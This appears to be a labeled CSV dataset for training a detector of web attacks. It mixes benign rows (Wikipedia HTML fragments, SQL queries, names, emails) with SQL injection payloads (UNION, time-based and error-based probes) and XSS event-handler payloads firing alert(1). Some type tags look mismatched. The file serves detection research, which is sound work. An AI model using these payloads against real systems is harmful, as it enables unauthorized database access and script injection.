Text,Label,type
" </p><p>The potential negative effects of AI and automation were a major issue for <a href=""/wiki/Andrew_Yang"" title=""Andrew Yang"">Andrew Yang </a>'s <a href=""/wiki/Andrew_Yang_2020_presidential_campaign"" title=""Andrew Yang 2020 presidential campaign"">2020 presidential campaign </a> in the United States.<sup id=""cite_ref-362"" class=""reference""><a href=""#cite_note-362"">&#91;351&#93; </a> </sup> Irakli Beridze, Head of the Centre for Artificial Intelligence and Robotics at UNICRI, United Nations, has expressed that ""I think the dangerous applications for AI, from my point of view, would be criminals or large terrorist organizations using it to disrupt large processes or simply do pure harm. [Terrorists could cause harm] via digital warfare, or it could be a combination of robotics, drones, with AI and other things as well that could be really dangerous. And, of course, other risks come from things like job losses. If we have massive numbers of people losing jobs and don't find a solution, it will be extremely dangerous. Things like lethal autonomous weapons systems should be properly governed — otherwise there's massive potential of misuse.""<sup id=""cite_ref-363"" class=""reference""><a href=""#cite_note-363"">&#91;352&#93; </a> </sup>",0,xss
<h1 id=x tabindex=1 ondeactivate=alert(1)></h1><input id=y autofocus>,2,xss
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;268–275, </li>",0,xss
"1%'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  '%'  =  '",1,sql
"<div id=""mw-page-base"" class=""noprint""> </div>",0,xss
" select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,xss
11ance3er,0,sql
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""unju""  =  ""unju",1,sql
SELECT * FROM these WHERE lying BETWEEN '1996-07-01' AND '1996-07-31',0,sql
" SELECT * FROM property ORDER BY characteristic ASC, sugar DESC",0,sql
SELECT COUNT ( red )  FROM at,0,sql
"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",1,xss
"<dfn draggable=""true"" ondragenter=""alert(1)"">test</dfn>",2,xss
or '7659'  =  '7659,1,sql
SELECT * FROM Customers WHERE ROWNUM < =  3;,0,xss
 </li>,0,xss
"  SELECT REPEAT ( ""SQL Tutorial"", 3 ) ;",0,sql
	 </span>,0,xss
SELECT * FROM mark WHERE pony = 'led' LIMIT 3,0,sql
"1   )    )    as hpxw where 1826  =  1826 union all select null,null,null,null,null,null,null,null#",1,sql
h2lmi0to,0,xss
<datalist onpointerenter=alert(1)>XSS</datalist>,2,xss
4.80152E+15,0,sql
In fiction:,0,xss
1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cgiu'  =  'cgiu,1,sql
"INSERT INTO automobile ( cry, strange, cost, though, wise, original )  VALUES  ( 'nobody', 'price'. zero', 'table', 'fully', 'tool', 'loose' )  ",0,sql
"<li><a href=""/wiki/Jaan_Tallinn"" title=""Jaan Tallinn"">Jaan Tallinn </a> </li>",0,xss
breon@sexotelefono.mc,0,sql
maracaja@telogis.ad,0,xss
"-2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",1,sql
"<li class=""toclevel-3 tocsection-53""><a href=""#Social_justice""><span class=""tocnumber"">8.2.3 ",0,xss
"   SELECT gone,lunch,rush,repeat,cup     (  (  colony JOIN spend ON quickly.sink =  cup.relationship )   INNER JOIN properON Orders.instrument =  hurt.speechID ) ",0,sql
1  )   as ztrb where 1052  =  1052 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,xss
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'ichh' like 'ichh",1,sql
" SELECT * FROM zulu ORDER BY height ASC, remove DESC",0,sql
1'  )   and   (  3020  =  3020  )  *6703 and   (  'botl' like 'botl,1,xss
escribano peraldo,0,sql
SELECT life FROM bar,0,xss
SELECT * FROM receive FETCH FIRST 3 ROWS ONLY,0,sql
1.22869E+15,0,sql
"  SELECT saddleID AS ID, shelter AS shade FROM order",0,sql
SELECT * FROM wore  WHERE beyond NOT LIKE '[beneath]%',0,sql
SELECT * FROM strength ORDER BY difference,0,sql
"<li><a href=""/wiki/Software_repository"" title=""Software repository"">Software repository </a> </li> </ul>",0,xss
" </p><p>In the long run, social skills and an understanding of human emotion and <a href=""/wiki/Game_theory"" title=""Game theory"">game theory </a> would be valuable to a social agent. Being able to predict the actions of others by understanding their motives and emotional states would allow an agent to make better decisions. Some computer systems mimic human emotion and expressions to appear more sensitive to the emotional dynamics of human interaction, or to otherwise facilitate <a href=""/wiki/Human%E2%80%93computer_interaction"" title=""Human–computer interaction"">human–computer interaction </a>.",0,xss
gilda6@mytanga.om,0,sql
"          <dd><a href=""/en/0.20/"">0.20</a></dd>",0,xss
"1 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
"<li><a href=""/wiki/Carbon_nanotube_field-effect_transistor"" title=""Carbon nanotube field-effect transistor"">Carbon nanotube field-effect transistor </a> </li>",0,xss
select   (  case when   (  5290  =  1720  )   then 5290 else 1/  (  select 0  )   end  )  --,1,sql
1'+  (  select 'rkap' where 9692  =  9692,1,sql
"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'pqxe' like 'pqxe",1,sql
3.06517E+15,0,sql
SELECT MIN ( making )  AS minerals FROM plural,0,sql
<frame id=x tabindex=1 ondeactivate=alert(1)></frame><input id=y autofocus>,2,xss
SELECT * FROM whistle WHERE hungry IN  ( SELECT familiar FROM process ) ,0,sql
"   SELECT may, shoot, loseFROM cell WHERE busy  IS NOT NULL",0,sql
"-3081""   )    )     )   or 3736  =  1899",1,sql
01633578a,0,sql
<ins id=x tabindex=1 onbeforedeactivate=alert(1)></ins><input autofocus>,2,xss
SELECT AVG ( muscle ) FROM dangerous,0,sql
42093532j,0,sql
"<li><a href=""/wiki/Received_view_of_theories"" title=""Received view of theories"">Received view </a>&#160;/&#32;<a href=""/wiki/Semantic_view_of_theories"" title=""Semantic view of theories"">Semantic view of theories </a> </li>",0,xss
"<div draggable=""true"" contenteditable>drag me</div><head ondragover=alert(1) contenteditable>drop here</head>",2,xss
"c/ concepcion alexandre 82,",0,sql
"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # eahg",1,sql
"estrecho de ormuz 62, 7-g",0,sql
"-9451%""  )   union all select 9963,9963,9963--",1,sql
ostapchuk casal,0,sql
SELECT * FROM doctor 3 SELECT * FROM lying,0,sql
SELECT * FROM sitting  WHERE cost NOT LIKE '[involved]%',0,sql
"<ul><li><a href=""/wiki/Algorithm_design"" class=""mw-redirect"" title=""Algorithm design"">Algorithm design </a> </li>",0,xss
SELECT away ( s )  FROM clothing FULL OUTER JOIN,0,sql
"<li><a href=""/wiki/Inference_engine"" title=""Inference engine"">Inference engine </a> </li>",0,xss
50163,0,xss
"   SELECT COUNT ( sea ) , gasoline FROM fine BY kept",0,xss
"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""gmld"" like ""gmld",1,sql
"1""   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""duuw""  =  ""duuw",1,sql
"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'moyb'  =  'moyb",1,sql
alberuela de tubo,0,sql
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'hvqt'  =  'hvqt",1,xss
" SELECT column_name ( s )  FROM please,lucky",0,xss
"<span onpaste=""alert(1)"" contenteditable>test</span>",2,xss
"1',  (  select   (  case when   (  2073  =  5314  )   then 1 else 1/  (  select 0  )   end   )    )   ",1,xss
"<s onmousedown=""alert(1)"">test</s>",2,xss
"<li><a href=""/wiki/Glossary_of_robotics"" title=""Glossary of robotics"">Robotics </a> </li>",0,xss
SELECT * FROM slept WHERE former BETWEEN '1996-07-01' AND '1996-07-31',0,xss
ron,0,xss
"<style>:target {color:red;}</style><aside id=x style=""transition:color 1s"" ontransitionend=alert(1)></aside>",2,xss
50690,0,xss
rebengivc@somosagelespaa.ie,0,sql
"1'+  (  select ttae where 4601  =  4601 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",1,sql
"1' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'eimq'  =  'eimq",1,sql
mullin@gopersonaltrainers.nr,0,sql
"1'  )   union all select null,null,null,null#",1,xss
"-1270'||  (  select 'mgdi' where 6785  =  6785 union all select 6785,6785#",1,sql
"	 </span>. <q>After a half-decade of quiet breakthroughs in artificial intelligence, 2015 has been a landmark year. Computers are smarter and learning faster than ever. </q> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Bloomberg+News&amp;rft.atitle=Why+2015+Was+a+Breakthrough+Year+in+Artificial+Intelligence&amp;rft.date=2015-12-08&amp;rft.aulast=Clark&amp;rft.aufirst=Jack&amp;rft_id=https%3A%2F%2Fwww.bloomberg.com%2Fnews%2Farticles%2F2015-12-08%2Fwhy-2015-was-a-breakthrough-year-in-artificial-intelligence&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
arganza,0,sql
ca1t01i4oso,0,sql
FROM  ( SELECT DISTINCT volume FROM try ) ,0,sql
SELECT 10 DIV 5;,0,sql
"SELECT * FROM till WHERE garage BETWEEN ""unhappy"" AND    ""double""",0,sql
"<img oncut=""alert(1)"" contenteditable>test</img>",2,xss
"  SELECT corner,grandfather FROM whispered WHERE behavior = 'income' UNION SELECT slowly, frog FROM greatly",0,sql
"<del oncopy=""alert(1)"" contenteditable>test</del>",2,xss
	 </span> ,0,xss
SELECT * FROM end 3,0,sql
" select sleep  (  5  )   and ""cyrb""  =  ""cyrb",1,sql
